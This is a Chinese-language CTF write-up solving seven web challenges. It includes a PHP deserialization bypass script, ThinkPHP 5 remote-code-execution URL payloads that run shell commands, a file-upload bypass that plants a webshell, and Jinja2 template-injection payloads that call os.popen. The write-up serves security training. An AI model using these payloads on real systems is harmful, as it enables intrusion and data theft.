# Web·进阶区

## 1、baby\_web

![image-20201202094708364](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202094708364.png)

根据题目描述，访问index.php

但是会直接跳转到1.php页面

打开F12工具栏

![image-20201202100144042](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202100144042.png)

发现有数据包，点击查看

![image-20201202100212068](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202100212068.png)

得到flag

```text
flag{very_baby_web}
```

## 2、Training-WWW-Robots

![image-20201202100318589](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202100318589.png)

打开环境是一个介绍页面

![image-20201202100444483](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202100444483.png)

根据提示查看robots.txt

![image-20201202100518144](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202100518144.png)

发现有一个fl0g.php的页面

访问一下

![image-20201202100607553](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202100607553.png)

得到flag

```text
cyberpeace{8328b5996bbec11e3b738531010b1577}
```

## 3、Web\_php\_unserialize

![image-20201202100657107](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202100657107.png)

打开页面，发现一段源码

![image-20201202100810919](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202100810919.png)

需要以下三个步骤

1、$file改成fl4g.php；

2、绕过：preg\_match\('/\[oc\]:\d+:/i', $var\)

3、跳过\_\_wakeup\(\)。

```text
<?php
class Demo {
    private $file = 'fl4g.php';//$file改成fl4g.php
}

$a= serialize(new demo);
$a= str_replace('O:4', 'O:+4',$a);//绕过preg_match
$a= str_replace(':1:', ':2:',$a);//绕过wakeup
echo base64_encode($a);
?>
```

生成Exp

![image-20201202104917993](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202104917993.png)

```text
TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
```

将其作为var值用get方法提交

![image-20201202105011931](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202105011931.png)

得到flag

```text
ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}
```

## 4、php\_rce

![image-20201202105237550](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202105237550.png)

环境为ThinkPHP V5

![image-20201202114841054](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202114841054.png)

网上查了一下，发现该版本存在rce远程执行漏洞，使用如下payload查看当前目录

```text
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
```

![image-20201202115316350](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202115316350.png)

返回上一级目录

```text
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls ../
```

![image-20201202115412490](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202115412490.png)

继续返回上一级目录

```text
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls ../../
```

![image-20201202115454490](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202115454490.png)

继续

```text
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls% ../../../
```

![image-20201202115529644](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202115529644.png)

发现flag，使用cat命令

```text
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20../../../flag
```

![image-20201202115624080](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202115624080.png)

得到flag

```text
flag{thinkphp5_rce}
```

## 5、upload1

![image-20201202115923368](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202115923368.png)

看题目应该是文件上传的题

环境打开后如下

![image-20201202120756844](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202120756844.png)

准备上传一句话

![image-20201202120952427](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202120952427.png)

发现只允许上传图片

修改文件后缀为jpg

![image-20201202121115688](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121115688.png)

开启burp，准备抓包，先修改代理

![image-20201202121208159](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121208159.png)

开启截断

![image-20201202121229281](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121229281.png)

准备上传

![image-20201202121257204](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121257204.png)

在请求包中修改文件后缀为php

![image-20201202121352284](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121352284.png)

放包，上传成功

![image-20201202121419359](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121419359.png)

使用蚁剑连接

![image-20201202121531235](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121531235.png)

测试一下连接情况

![image-20201202121552716](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121552716.png)

成功，完成添加，进入网站目录

![image-20201202121630003](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121630003.png)

在上级目录html中发现flag.php

![image-20201202121716973](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121716973.png)

得到flag

![image-20201202121731254](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202121731254.png)

```text
cyberpeace{2a5d620ae581a1f0831022cf5b40b0ea}
```

## 6、Web\_php\_include

![image-20201202123625584](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202123625584.png)

打开环境是一段源码

![image-20201202123700188](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202123700188.png)

传入了一个hello参数，尝试赋一个值

![image-20201202123903006](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202123903006.png)

发现这个hello是有回显的，所以说不定这里可以命令执行然后回显到浏览器

尝试构造payload，首先要构造hello这个参数我们必须先让我们传进的page参数为真才行

![image-20201202124110669](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202124110669.png)

发现疑似flag文件，使用show\_source\(\)函数查看该文件

![image-20201202124237632](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202124237632.png)

得到flag

```text
ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}
```

## 7、Web\_python\_template\_injection

![image-20201202124612687](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202124612687.png)

环境提示python模板注入

![image-20201202125051402](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202125051402.png)

尝试看看内部{}中的代码是否被执行

![image-20201202125410514](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202125410514.png)

确实被执行了

调用os模块的popen执行ls打印所有文件

```text
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen("ls").read()}}
```

![image-20201202125231518](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202125231518.png)

cat fl4g

```text
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen("cat fl4g").read()}}
```

![image-20201202131934513](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20201202131934513.png)

得到flag

```text
ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}
```

